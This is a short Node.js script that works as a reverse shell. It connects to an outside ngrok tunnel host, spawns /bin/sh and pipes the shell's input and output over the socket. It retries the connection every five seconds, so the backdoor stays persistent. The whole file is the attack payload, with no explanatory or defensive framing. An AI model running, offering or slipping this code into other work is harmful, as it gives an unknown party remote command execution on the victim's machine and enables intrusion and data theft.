(function(){
    var net = require("net"), cp = require("child_process");
    var host = "6.tcp.eu.ngrok.io";
    var port = 15727;
    
    function connect() {
        var client = new net.Socket();
        
        client.connect(port, host, function() {
            var sh = cp.spawn("/bin/sh", []);
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });

        client.on('error', function(e) {
            setTimeout(connect, 5000);
        });

        client.on('close', function() {
            setTimeout(connect, 5000);
        });
    }
    
    connect();
})();
